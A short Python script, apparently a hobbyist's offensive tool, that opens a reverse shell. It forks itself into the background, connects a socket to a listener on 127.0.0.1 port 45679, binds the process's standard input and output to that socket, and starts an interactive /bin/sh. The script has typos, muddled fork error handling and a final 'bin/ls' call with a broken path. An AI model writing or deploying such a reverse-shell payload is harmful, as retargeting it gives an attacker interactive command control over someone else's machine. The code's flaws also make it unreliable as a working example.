import socket
import subprocess
import os

'''
This script will create a reverse shell and will be listening local host and specisific post. 

'''



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    if os.fork() > 0:
        os._exit(0)
        
        
except OSError as error:
    print(f'Error in for process: {error.errno} {error.strerror} ')
    pid = os.fork()
    if pid > 0:
        print('For Not Valid')
        
sock.connect(('127.0.0.1', 45679))

os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)

remote_shell = subprocess.call(['/bin/sh', '-i'])
file_list = subprocess.call(['bin/ls', '-i'])

